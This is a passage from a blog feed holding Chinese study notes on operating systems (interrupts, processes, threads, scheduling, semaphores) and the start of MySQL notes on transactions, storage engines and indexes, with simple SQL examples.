操作系统体系结构</h3><p>大内核：将操作系统的主要功能模块都作为系统内核，运行在内核态</p><ul><li>优点：高性能</li><li>缺点：内核代码庞大、结构混乱、难以维护</li></ul><p>微内核：只将最基本功能留在内核</p><ul><li>优点：内核功能少、结构清晰、易于维护</li><li>缺点：需要频繁在核心态与用户态之间切换，性能低</li></ul><h3 id="1-6-中断和异常"><a href="#1-6-中断和异常" class="headerlink" title="1.6 中断和异常"></a>1.6 中断和异常</h3><p>中断机制：使得多道程序并发执行，避免了串行执行的低效率。</p><ul><li>当中断发生时，CPU立即进入核心态</li><li>当中断发生后，运行的进程暂停运行，由操作系统内核对中断进行处理</li><li>对于不同的中断信号，进行不同的处理</li></ul><p>发生了中断则意味着需要操作系统介入开展管理工作。由于操作系统的管理工作需要使用特权指令，所以CPU需要从用户态切换为内核态，使操作系统获得计算机的控制权。</p><ul><li>用户态 -&gt; 核心态：中断实现（唯一途径）</li><li>核心态 -&gt; 用户态：执行一个特权指令，通过PSW设置</li></ul><p>中断的分类：</p><ul><li><p>内中断：也称为异常、例外、陷入</p><ul><li>自愿中断：即指令中断</li><li>强迫中断：硬件故障与软件中断</li></ul></li><li><p>外中断：外设请求、人工干预，如IO操作完成后发出的中断信号</p><p>处理过程如下：</p><ol><li>执行完每个指令后，CPU需检查当前是否有外部中断信号</li><li>如果检测到，则需要保护被中断进程的CPU环境（通过PC、PSW、各种寄存器等）</li><li>根据中断信号类型转入相应的中断处理程序</li><li>恢复原进程的CPU环境并退出中断，返回原进程继续向下执行</li></ol></li></ul><h3 id="1-7-系统调用"><a href="#1-7-系统调用" class="headerlink" title="1.7 系统调用"></a>1.7 系统调用</h3><p>操作系统需要向上提供一些简单易用的服务。包括命令接口与程序接口。</p><p>其中，程序接口由一组系统调用组成。</p><ul><li>系统调用可以理解为一种可供应用程序调用的特殊函数，应用程序可以发出系统调用请求来获得操作系统的服务。</li><li>用户进程想要操纵共享资源，只能通过系统调用向操作系统发出请求，由操作系统对各个请求协调管理。这样可以保证系统的稳定性与安全性，防止用户进行非法操作。</li></ul><p>系统调用分类：在核心态下完成</p><ul><li>设备管理、文件管理、进程控制、进程通信、内存管理</li></ul><p>系统调用过程：</p><ol><li>用户态传递系统调用参数</li><li>用户态执行陷入指令：唯一一个只能在用户态执行、不能在内核态执行的指令<ul><li>陷入指令实在用户态执行的，执行陷入指令后立即引发一个内中断，CPU进入内核态</li></ul></li><li>内核态调用相应服务程序</li><li>返回用户程序</li></ol><h2 id="2-进程"><a href="#2-进程" class="headerlink" title="2. 进程"></a>2. 进程</h2><h3 id="2-1-进程概述"><a href="#2-1-进程概述" class="headerlink" title="2.1 进程概述"></a>2.1 进程概述</h3><p>程序段、数据段、PCB三部分组成了<strong>进程实体</strong></p><h4 id="2-1-1-进程定义"><a href="#2-1-1-进程定义" class="headerlink" title="2.1.1 进程定义"></a>2.1.1 进程定义</h4><ul><li>进程是程序的一次执行过程</li><li>进程是一个程序及其数据在处理机上顺序执行时发生的活动</li><li>进程是具有独立功能的程序在数据集合上运行的过程，是系统进行资源分配与调度的一个独立单位</li><li>进程是进程实体的运行过程</li></ul><h4 id="2-1-2-进程组成"><a href="#2-1-2-进程组成" class="headerlink" title="2.1.2 进程组成"></a>2.1.2 进程组成</h4><p>程序段：存放程序代码</p><p>数据段：存放程序运行时使用、产生的运算数据。如全局变量、局部变量等</p><p>PCB：操作系统通过PCB管理进程，其中存储着管理所需要的信息</p><ul><li>进程描述信息：进程标识符PID、用户标识符UID</li><li>进程控制和管理信息：进程当前状态、进程优先级</li><li>资源分配清单：程序段指针、数据段指针、键盘、鼠标</li><li>处理机相关信息：各种寄存器值 -&gt; 便于进程切换</li></ul><h4 id="2-1-3-进程组织"><a href="#2-1-3-进程组织" class="headerlink" title="2.1.3 进程组织"></a>2.1.3 进程组织</h4><ol><li>连接方式：<ul><li>按照进程状态将PCB分为多个队列</li><li>操作系统持有指向各个队列的指针</li></ul></li><li>索引方式：<ul><li>根据进程状态的不同，建立多张索引表</li><li>操作系统持有指向各个索引表的指针</li></ul></li></ol><h4 id="2-1-4-进程特征"><a href="#2-1-4-进程特征" class="headerlink" title="2.1.4 进程特征"></a>2.1.4 进程特征</h4><ul><li>动态性：进程是程序的一次执行过程，动态地产生、变化和消亡</li><li>并发性：内存中有多个进程实体，可并发执行</li><li>独立性：进程是能独立运行、独立获得资源、独立接收调度的基本单位</li><li>异步性：各进程按各自独立、不可预知的速度前进，OS需提供进程同步机制解决异步问题</li><li>结构性：每个进程都配置一个PCB。由程序段、数据段和PCB组成</li></ul><h4 id="2-1-5-进程状态与转换"><a href="#2-1-5-进程状态与转换" class="headerlink" title="2.1.5 进程状态与转换"></a>2.1.5 进程状态与转换</h4><p>三种基本状态：Running、Ready、Waiting&#x2F;Blocked</p><ul><li>Running：占有CPU，并在CPU上运行<ul><li>单核下每一时刻只有一个进程处于运行态，多核下可以有多个</li></ul></li><li>Ready：已具备运行条件，但没有空闲CPU，暂时不能运行</li><li>Waiting&#x2F;Blocked：因等待某一事件暂时不能运行</li></ul><p>另外两种状态：New、Terminated</p><ul><li>New：进程正在被创建，操作系统为其分配资源，初始化PCB</li><li>Terminated：进程正在从系统重撤销，回收资源与撤销PCB</li></ul><p>转换：</p><p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221112203658516.png" alt="image-20221112203658516"></p><h4 id="2-1-6-进程控制"><a href="#2-1-6-进程控制" class="headerlink" title="2.1.6 进程控制"></a>2.1.6 进程控制</h4><p>进程控制：对系统中所有进程实施有效的管理。它具有创建新进程、撤销已有进程、实现进程状态转换等功能。</p><ul><li>创建进程：初始化PCB，分配系统资源</li><li>创建态 -&gt; 就绪态：修改PCB内容，将PCB添加到就绪队列</li><li>就绪态 -&gt; 运行态：恢复进程运行环境，修改PCB内容和相应队列</li><li>运行态 -&gt; 阻塞态：保存进程运行环境，修改PCB内容和相应队列</li><li>阻塞态 -&gt; 就绪态：需要修改PCB内容和相应队列。如果等待的是资源，还需要为进程分配系统资源。</li><li>运行态 -&gt; 就绪态：保存进程运行环境，修改PCB内容和相应队列</li><li>运行态 -&gt; 终止态：回收进程拥有的资源，撤销PCB</li></ul><p>实现进程控制：</p><p>使用原语实现进程控制。原语的特点是在执行期间不允许中断，即原子性操作。</p><p>原语采用“关中断指令”和“开中断指令”实现</p><ol><li>更新PCB中的信息<ul><li>修改进程状态标志</li><li>将当前进程的运行环境保存到PCB</li><li>从PCB中恢复该进程的运行环境</li></ul></li><li>将PCB插入到合适的队列</li><li>分配&#x2F;回收资源</li></ol><h4 id="2-1-7-进程通信"><a href="#2-1-7-进程通信" class="headerlink" title="2.1.7 进程通信"></a>2.1.7 进程通信</h4><p>进程通信：进程之间的信息交换</p><p>各进程拥有的内存地址空间相互独立，为了保证安全，一个进程不能直接访问另一个进程的地址空间。</p><p>为了保证进程间的安全通信：</p><ul><li>共享存储：操作系统开辟一块共享空间供各个进程共享使用，但进程对共享空间的访问必须是互斥的<ul><li>基于数据结构的共享：限定了数据格式大小，低级通信</li><li>基于存储区的共享：自由，高级通信</li></ul></li><li>管道通信：用于连接读写进程的一个共享文件，即在内存中开辟一个固定大小的缓冲区<ul><li>只能采用半双工通信，某一时间段内只能实现单向传输，若要实现双向同时通信，则需要设置两个管道</li><li>各进程需要互斥地访问管道</li><li>数据以字符流形式写入管道，当管道写满时，写进程的write将被阻塞，等待读进程将数据取走。当数据全部被取走后，管道为空，此时读进程的read将被阻塞</li><li>如果没有写满，则不允许读；如果没有读空，则不允许写</li><li>数据一旦被读出，就从管道中被抛弃，这意味着读进程最多只有一个</li></ul></li><li>消息传递：以格式化消息为单位进行数据交换<ul><li>直接通信：消息直接挂到接收进程的消息缓冲队列上</li><li>间接通信：消息需要先发到中间实体信箱中</li></ul></li></ul><h4 id="2-1-8-线程概念和多线程模型"><a href="#2-1-8-线程概念和多线程模型" class="headerlink" title="2.1.8 线程概念和多线程模型"></a>2.1.8 线程概念和多线程模型</h4><p>线程是一个基本的CPU执行单元，也是程序执行流的最小单位。</p><p>引入线程之后，不仅进程之间可以并发，进程内的各线程之间也可以并发，从而进一步提升了系统的并发度，使得一个进程也可以并发处理各种任务。</p><ul><li>资源分配与调度<ul><li>无线程时：进程是资源分配、调度的基本单位</li><li>引入线程后：进程是资源分配的基本单位，线程是调度的基本单位</li></ul></li><li>并发性<ul><li>无线程时：只能进程间并发</li><li>引入线程后：线程之间也可以并发，提升了并发度</li></ul></li><li>系统开销<ul><li>无线程时：切换进程运行环境的开销很大</li><li>引入线程后：同一进程内的线程切换不需要切换进程环境，系统开销很小</li></ul></li></ul><p>线程的实现方式：</p><ul><li>用户级线程：由应用程序通过线程库实现<ul><li>所有线程管理工作都由应用程序负责</li><li>用户级线程中，线程切换在用户态下即可完成，无需操作系统干预</li><li>在用户看来，存在多个线程，但操作系统内核并意识不到县城的存在。即：对用户不透明，对操作系统透明</li></ul></li><li>内核级线程：由操作系统内核完成对线程的管理工作</li></ul><p>多线程模型：内核级线程才是处理机CPU核分配的单位</p><ul><li>多对一模型：多个用户级线程映射到一个内核级线程<ul><li>优点：在用户空间即可完成线程切换，开销小，效率高</li><li>缺点：如果一个用户级离县城阻塞，会导致整个进程均被阻塞</li></ul></li><li>一对一模型：一个用户级线程映射到一个内核级线程<ul><li>优点：并发能力强，不会出现单个线程阻塞造成进程阻塞的问题</li><li>缺点：一个用户进程占用多个内核级线程，线程切换操作由操作系统内核完成，需要切换到核心态，管理成本高，开销大</li></ul></li><li>多对多模型：<ul><li>克服了并发度低的缺点、克服了一个用户进程占用过多内核级线程开销大的缺点</li></ul></li></ul><h3 id="2-2-调度算法"><a href="#2-2-调度算法" class="headerlink" title="2.2 调度算法"></a>2.2 调度算法</h3><h4 id="2-2-1-调度概念"><a href="#2-2-1-调度概念" class="headerlink" title="2.2.1  调度概念"></a>2.2.1  调度概念</h4><p>往往进程数量多于CPU数量。需要按照一定算法从就绪队列中选择一个进程并将CPU资源分配给它。</p><p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221113194506806.png" alt="image-20221113194506806"></p><h4 id="2-2-2-调度算法评价指标"><a href="#2-2-2-调度算法评价指标" class="headerlink" title="2.2.2 调度算法评价指标"></a>2.2.2 调度算法评价指标</h4><p>CPU利用率：忙碌时间 &#x2F; 总时间</p><p>系统吞吐量：完成作业的数量 &#x2F; 总花费时间</p><p>周转时间：从作业被提交到系统开始，到作业完成为止的时间间隔</p><ul><li>包含：<ol><li>作业在外存后备队列上等待作业调度的时间</li><li>进程在就绪队列上等待进程调度的时间</li><li>进程在CPU上执行的时间</li><li>进程等待I&#x2F;O操作完成的时间</li></ol></li></ul><p>带权周转时间：作业周转时间 &#x2F; 作业实际运行的时间 &gt;&#x3D; 1</p><p>等待时间：进程&#x2F;作业处于等待处理机状态时间之和</p><p>响应时间：从用户提交请求到首次产生响应的时间</p><h4 id="2-2-3-先来先服务FCFS"><a href="#2-2-3-先来先服务FCFS" class="headerlink" title="2.2.3 先来先服务FCFS"></a>2.2.3 先来先服务FCFS</h4><p>从公平角度出发，按照作业&#x2F;进程到达的先后顺序进行服务</p><ul><li>用于作业调度时，考虑哪个作业先到达后备队列</li><li>用于进程调度时，考虑哪个进程先到达就绪队列</li></ul><p>非抢占式算法</p><p>优点：公平、算法实现简单，不会导致饥饿</p><p>缺点：有利于长作业，不利于短作业。短作业排在长作业之后需要等待较长时间。</p><h4 id="2-2-4-短作业优先SJF"><a href="#2-2-4-短作业优先SJF" class="headerlink" title="2.2.4 短作业优先SJF"></a>2.2.4 短作业优先SJF</h4><p>追求最少的平均等待时间、最少的平均周转时间、最少的平均带权周转时间</p><p>即最短的作业&#x2F;进程优先得到服务，每次调度时选择当前已到达且运行时间最短的作业&#x2F;进程。为非抢占式的。</p><p>优点：“最短的”平均等待时间、平均周转时间</p><p>缺点：不公平，对短作业有利，对长作业不利，可能产生饥饿现象</p><h5 id="抢占式短作业优先版本SRTN"><a href="#抢占式短作业优先版本SRTN" class="headerlink" title="抢占式短作业优先版本SRTN"></a>抢占式短作业优先版本SRTN</h5><p>最短剩余时间优先算法：如果新到达的进程剩余时间比当前运行的进程剩余时间更短，则由新进程抢占处理机，当前运行进程就需要重新回到就绪队列。</p><h4 id="2-2-5-高响应比优先算法HRRN"><a href="#2-2-5-高响应比优先算法HRRN" class="headerlink" title="2.2.5 高响应比优先算法HRRN"></a>2.2.5 高响应比优先算法HRRN</h4><p>综合考虑作业&#x2F;进程的等待时间与要求服务的时间</p><p>响应比：等待时间 + 要求服务时间 &#x2F; 要求服务时间</p><p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221113203612255.png" alt="image-20221113203612255"></p><p>以上算法均没有考虑响应时间，不区分任务的紧急程度，对用户而言交互性很差。</p><h4 id="2-2-6-时间片轮转-Round-Robin"><a href="#2-2-6-时间片轮转-Round-Robin" class="headerlink" title="2.2.6 时间片轮转 Round-Robin"></a>2.2.6 时间片轮转 Round-Robin</h4><p>公平地轮流地为各个进程服务，让每个进程在一定时间间隔内都可以得到响应</p><p>按照各个进程到达就绪队列的顺序，轮流让每个进程执行一个时间片。如进程未在一个时间片内执行完，则剥夺CPU，将进程重新放到就绪队列队尾重新排队。</p><p>适用于进程调度，只要作业放入内存并建立了进程后才分配时间片。</p><p>属于抢占式算法，由时钟发出中断通知CPU时间片已到。</p><ul><li>若时间片设置过大，则时间片轮转调度算法可能退化为先来先服务调度算法，会增大进程响应时间。</li><li>若时间片设置过小，则导致进程切换过于频繁，使实际进程执行时间比例减少</li></ul><p>优点：公平、响应快、适用于分时操作系统、无饥饿</p><p>缺点：高频切换进程带来开销、不区分任务紧急程度</p><h4 id="2-2-7-优先级调度算法"><a href="#2-2-7-优先级调度算法" class="headerlink" title="2.2.7 优先级调度算法"></a>2.2.7 优先级调度算法</h4><p>需要根据任务的紧急程度来决定处理顺序</p><p>调度时选择优先级最高的作业&#x2F;进程</p><p>优点：灵活地调整对各种作业&#x2F;进程的偏好程度</p><p>缺点：可能导致饥饿</p><h4 id="2-2-8-多级反馈队列调度算法"><a href="#2-2-8-多级反馈队列调度算法" class="headerlink" title="2.2.8 多级反馈队列调度算法"></a>2.2.8 多级反馈队列调度算法</h4><ol><li>设置多级就绪队列，各级队列优先级从高到低，时间片从小到大</li><li>新进程到达时先进入第1级队列，按照FCFS原则排队等待分配时间片。<ul><li>若用完时间片进程还未结束，则进程进入下一级队列的队尾</li><li>若此时已经在最下级队列，则重新放到该队列队尾</li></ul></li><li>只有第k级队列为空时，才会为k+1级对头的进程分配时间片</li></ol><p>是一种抢占式算法</p><p>优点：</p><ol><li>对各类型进程相对公平</li><li>每个新到达的进程都可以很快得到响应</li><li>短进程只用较少的时间就可完成</li><li>可灵活地调整各类进程的偏好程度</li></ol><h3 id="2-3-进程同步与互斥"><a href="#2-3-进程同步与互斥" class="headerlink" title="2.3 进程同步与互斥"></a>2.3 进程同步与互斥</h3><p>同步：两个或多个进程协调工作次序</p><p>互斥：一个时间段只允许一个进程访问该资源，互斥访问临界资源</p><ul><li><p>进入区、临界区、退出区、剩余区</p></li><li><p>空闲让进：临界区空闲时，可以允许一个请求进入临界区的进程立即进入临界区</p></li><li><p>忙则等待：当已有进程进入临界区时，其他试图进入临界区的进程必须等待</p></li><li><p>有限等待：对请求访问的进程，应保证能在有限时间内进入临界区（保证不会饥饿）</p></li><li><p>让权等待：当进程不能进入临界区时，应立即释放处理机，防止进程忙等待</p></li></ul><h4 id="2-3-1-进程互斥实现"><a href="#2-3-1-进程互斥实现" class="headerlink" title="2.3.1 进程互斥实现"></a>2.3.1 进程互斥实现</h4><ol><li><p>单标志法：</p><p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221114180859131.png" alt="image-20221114180859131"></p><p>缺点：Starvation：If P0 never enters CS, P1 starve</p></li><li><p>双标志先检查法</p><p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221114181642885.png" alt="image-20221114181642885"></p><p>缺点：存在并发问题，违反忙则等待原则。原因是while循环的检查与上锁两个步骤不具有原子性，在这之间可能出现线程切换。</p><p>双标志后检查法：调换了检查与上锁步骤</p><p>缺点：存在并发问题，造成死锁，导致线程均无法进入临界区。</p></li><li><p>Perterson算法 </p><p>孔融让梨思想：先表达自己的意愿，再主动请对方先使用临界区</p><p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221114182353399.png" alt="image-20221114182353399"></p></li></ol><h4 id="2-3-2-信号量机制"><a href="#2-3-2-信号量机制" class="headerlink" title="2.3.2 信号量机制"></a>2.3.2 信号量机制</h4><p>用户进程可以使用操作系统提供的一对原语对信号量进行操作</p><ul><li>信号量：表示系统中某种资源的数量</li><li>一对原语：wait、signal 或 P、V操作</li></ul><p>整型信号量</p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221115211728841.png" alt="image-20221115211728841" style="zoom:50%;" /><p>记录型信号量</p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221115211815584.png" alt="image-20221115211815584" style="zoom: 50%;" /><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221115211905535.png" alt="image-20221115211905535" style="zoom: 50%;" /><h5 id="信号量实现进程互斥"><a href="#信号量实现进程互斥" class="headerlink" title="信号量实现进程互斥"></a>信号量实现进程互斥</h5><p>对于不同的临界资源需要设置不同的互斥信号量</p><ol><li>划定临界区</li><li>设置互斥信号量为mutex，初始值为1</li><li>在临界区之前执行 P(mutex)</li><li>在临界区之后执行 V(mutex)</li></ol><p>P-V操作必须成对出现</p><h5 id="信号量实现进程同步"><a href="#信号量实现进程同步" class="headerlink" title="信号量实现进程同步"></a>信号量实现进程同步</h5><p>进程并发执行，存在异步性，因此两者交替推进的次序是不确定的。</p><ol><li>设置同步信号量S，初始值为0</li><li>在前操作之后执行 V(S)</li><li>在后操作之前执行 P(S)</li></ol><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221115213153034.png" alt="image-20221115213153034" style="zoom:50%;" />]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统</tag>
      
      <tag>并发</tag>
      
      <tag>线程</tag>
      
      <tag>内存</tag>
      
      <tag>进程</tag>
      
      <tag>IO</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MySQL学习笔记</title>
    <link href="/2022/11/11/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/11/11/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="MySQL笔记"><a href="#MySQL笔记" class="headerlink" title="MySQL笔记"></a>MySQL笔记</h1><h2 id="1-事务"><a href="#1-事务" class="headerlink" title="1. 事务"></a>1. 事务</h2><h3 id="1-1-事务介绍"><a href="#1-1-事务介绍" class="headerlink" title="1.1 事务介绍"></a>1.1 事务介绍</h3><p>事务是一组操作的集合，是一个不可分割的工作单位。</p><p>事务会把所有操作作为一个整体一起向系统提交或撤销操作请求，这些操作要么同时成功，要么同时失败。</p><ul><li>注意：MySQL事务默认是自动提交的。每执行完一条语句，MySQL会隐式地提交</li></ul><h3 id="1-2-事务操作"><a href="#1-2-事务操作" class="headerlink" title="1.2 事务操作"></a>1.2 事务操作</h3><ol><li><p>通过设置事务提交来控制事务</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> @<span class="hljs-variable">@autocommit</span>;<br><span class="hljs-keyword">set</span> @<span class="hljs-variable">@autocommit</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; # 取消事务手动提交<br></code></pre></td></tr></table></figure></li><li><p>开启事务</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">start</span> transaction<br></code></pre></td></tr></table></figure></li><li><p>提交与回滚事务</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">commit</span>; # 提交<br><span class="hljs-keyword">rollback</span>; # 回滚<br></code></pre></td></tr></table></figure></li></ol><h3 id="1-3-事务四大特性"><a href="#1-3-事务四大特性" class="headerlink" title="1.3 事务四大特性"></a>1.3 事务四大特性</h3><p>ACID</p><ul><li>原子性：事务是不可分割的最小操作单元，要么全部成功，要么全部失败。</li><li>一致性：事务完成时，必须使所有数据都保持一致状态</li><li>隔离性：数据库系统提供的隔离机制，保证事务在不受外部并发操作影响的独立环境下运行。</li><li>持久性：事务一旦提交或回滚，它对数据库中的数据改变是永久的。</li></ul><h3 id="1-4-并发事务问题"><a href="#1-4-并发事务问题" class="headerlink" title="1.4 并发事务问题"></a>1.4 并发事务问题</h3><ul><li>脏读：一个事务读到另外一个事务还未提交的数据</li><li>不可重复读：一个事务先后读取同一条记录，但两次读取的数据不同。原因是另一个事务修改了其中的部分数据。</li><li>幻读：一个事务按照条件查询数据时，没有对应的数据行，但是在插入数据时，又发现这行数据已经存在。原因是另一个事务在此过程中插入了此条数据。</li></ul><h3 id="1-5-事务隔离级别"><a href="#1-5-事务隔离级别" class="headerlink" title="1.5  事务隔离级别"></a>1.5  事务隔离级别</h3><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221111224048721.png" alt="image-20221111224048721" style="zoom:50%;" /><ul><li><p>查看事务隔离级别</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> @<span class="hljs-variable">@transaction</span>_isolation<br></code></pre></td></tr></table></figure></li><li><p>设置事务隔离级别</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">set</span> [<span class="hljs-keyword">GLOBAL</span><span class="hljs-operator">|</span>SESSION] transaction_isolation <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;隔离级别&#x27;</span><br><span class="hljs-comment">-- 隔离级别格式：READ-UNCOMMITTED ，READ-COMMITTED  ，REPEATABLE-READ  ，SERIALIZABLE</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="2-存储引擎"><a href="#2-存储引擎" class="headerlink" title="2. 存储引擎"></a>2. 存储引擎</h2><h3 id="2-1-MySQL体系结构"><a href="#2-1-MySQL体系结构" class="headerlink" title="2.1  MySQL体系结构"></a>2.1  MySQL体系结构</h3><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221111224506954.png" alt="image-20221111224506954" style="zoom:50%;" /><ol><li>连接层：完成诸如连接处理、授权认证等操作。在该层引入线程池概念，为通过认证安全接入的客户端提供线程</li><li>服务层：完成绝大多数核心功能，如SQL接口，并完成缓存的查询、SQL的分析与优化、部分内置函数的执行。在该层，服务器会解析查询并创建相应的内部解析数，对其完成相应的优化：如表查询顺序、是否利用索引等。</li><li>引擎层：真正负责MySQL中数据的存储和提取。</li><li>存储层：将数据（redolog、undolog、数据、索引、二进制日志、错误日志、查询日志、慢查询日志等）存储在文件系统之上</li></ol><h3 id="2-2-存储引擎介绍"><a href="#2-2-存储引擎介绍" class="headerlink" title="2.2 存储引擎介绍"></a>2.2 存储引擎介绍</h3><p>存储引擎是MySQL数据库的核心</p><ul><li>存储引擎是存储数据、建立索引、更新查询数据等技术的实现方式</li><li>存储引擎是基于表的，而不是基于库的。在创建表时，可以为表指定存储引擎</li></ul><h4 id="2-2-1-InnoDB"><a href="#2-2-1-InnoDB" class="headerlink" title="2.2.1 InnoDB"></a>2.2.1 InnoDB</h4><p>InnoDB是一种兼顾高可靠性与高性能的通用存储引擎，在MySQL5.5之后为默认存储引擎</p><p>特点：</p><ol><li>DML操作遵循ACID模型，支持事务</li><li>行级锁，提高并发访问性能</li><li>支持外键FOREIGN KEY约束，保证数据完整性与正确性</li></ol><p>文件：xxx.ibd。xxx为表名，该引擎下每张表都会对应一个表空间文件：存储该表的表结构、数据与索引</p><p>逻辑存储结构</p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221111225328390.png" alt="image-20221111225328390" style="zoom:50%;" /><ul><li>表空间：InnoDB存储引擎逻辑结构的最高层，ibd文件其实就是其表空间文件，其中包含多个Segment段</li><li>段：表空间是由各个段组成的：数据段、索引段、回滚段等。一个段中包含多个区</li><li>区：区是表空间的单元结构，每个区大小为1M。默认情况下，页大小为16K，即一个区中一共有64个连续的页</li><li>页：页是组成区的最小单元，页也是InnoDB存储引擎磁盘管理的最小单元，每个页大小默认为16KB</li><li>行：InnoDB存储引擎是面向行的，数据是按行存放</li></ul><h3 id="2-3-存储引擎对比"><a href="#2-3-存储引擎对比" class="headerlink" title="2.3 存储引擎对比"></a>2.3 存储引擎对比</h3><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221111225819681.png" alt="image-20221111225819681" style="zoom:50%;" /><p>InnoDB与MyISAM区别：</p><ul><li>InnoDB支持事务；而MyISAM不支持</li><li>InnoDB支持行锁与表锁；而MyISAM只支持表锁，不支持行锁</li><li>InnoDB支持外键；而MyISAM不支持</li></ul><h2 id="3-索引"><a href="#3-索引" class="headerlink" title="3. 索引"></a>3. 索引</h2><h3 id="3-1-索引概述"><a href="#3-1-索引概述" class="headerlink" title="3.1 索引概述"></a>3.1 索引概述</h3><p>索引是一种帮助MySQL高效获取数据的数据结构。除数据库本身存储的数据，数据库系统还维护者满足特定查找算法的数据结构，这些数据结构通过某种方式引用指向数据，从而实现高级查找算法。</p><p>优点：</p><ol><li>提高数据检索的效率，降低数据库IO成本</li><li>通过索引对数据进行排序，降低数据排序成本，降低CPU消耗</li></ol><p>缺点：</p><ol><li>索引也需要占据空间（不过磁盘不值钱）</li><li>索引大大提升了查询效率，但同时也降低了更新表的速度</li></ol><h3 id="3-2-索引结构"><a href="#3-2-索引结构" class="headerlink" title="3.2 索引结构"></a>3.2 索引结构</h3><h4 id="3-2-1-二叉搜索树"><a href="#3-2-1-二叉搜索树" class="headerlink" title="3.2.1 二叉搜索树"></a>3.2.1 二叉搜索树</h4><p>二叉搜索树虽然能提升查询效率，但是存在极端情况：顺序插入时会形成链表</p><p>此外：大数据量的情况下，二叉树的层级较深，检索速度慢</p><p>若采用红黑树，虽然解决了极端情况出现的链表问题，但仍然存在第二点问题。</p><h4 id="3-2-2-B-Tree"><a href="#3-2-2-B-Tree" class="headerlink" title="3.2.2 B-Tree"></a>3.2.2 B-Tree</h4><p>B树是一种多路平衡查找树，相比于二叉树，B树每个节点可以有多个分支。</p><p>以一颗最大度数为5的B-Tree为例，每个节点最多可以存储4个key，5个指针</p><p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221111230857511.png" alt="image-20221111230857511"></p><h4 id="3-2-3-B-Tree"><a href="#3-2-3-B-Tree" class="headerlink" title="3.2.3 B+Tree"></a>3.2.3 B+Tree</h4><p>B+Tree是B-Tree的变体。其只有叶子节点存放具体的数据。</p><p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221111231037171.png" alt="image-20221111231037171"></p><p>B+Tree与B-Tree的对比：</p><ol><li>B 树的所有节点既存放键(key) 也存放 数据(data)，而 B+树只有叶子节点存放 key 和 data，其他内节点只存放 key。</li><li>B 树的叶子节点都是独立的;B+树的叶子节点有一条引用链指向与它相邻的叶子节点。</li><li>B 树的检索的过程相当于对范围内的每个节点的关键字做二分查找，可能还没有到达叶子节点，检索就结束了。而 B+树的检索效率就很稳定了，任何查找都是从根节点到叶子节点的过程，叶子节点的顺序检索很明显。</li></ol><h4 id="3-2-4-Hash"><a href="#3-2-4-Hash" class="headerlink" title="3.2.4 Hash"></a>3.2.4 Hash</h4><p>MySQL中除了支持B+Tree索引，还支持Hash索引</p><p>哈希表是键值对的集合，通过键(key)即可快速取出对应的值(value)，因此哈希表可以快速检索数据（接近 O(1)）。</p><p>但是哈希算法有个 <strong>Hash 冲突</strong> 问题，也就是说多个不同的 key 最后得到的 index 相同。通常情况下，我们常用的解决办法是 <strong>链地址法</strong>。链地址法就是将哈希冲突数据存放在链表中。就比如 JDK1.8 之前 <code>HashMap</code> 就是通过链地址法来解决哈希冲突的。不过，JDK1.8 以后<code>HashMap</code>为了减少链表过长的时候搜索时间过长引入了红黑树。</p><p>优点：Hash索引对于单条数据查询效率很高</p><p>缺点：Hash索引只能用于对等比较，不支持范围查询；无法利用索引完成排序操作</p><h3 id="3-3-索引分类"><a href="#3-3-索引分类" class="headerlink" title="3.3 索引分类"></a>3.3 索引分类</h3><p>在MySQL数据库中，索引主要分为：主键索引、唯一索引、常规索引、全文索引</p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221111232503785.png" alt="image-20221111232503785" style="zoom:50%;" /><p>根据索引的存储形式，又可分为：聚集索引、二级索引</p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221111232559549.png" alt="image-20221111232559549" style="zoom:50%;" 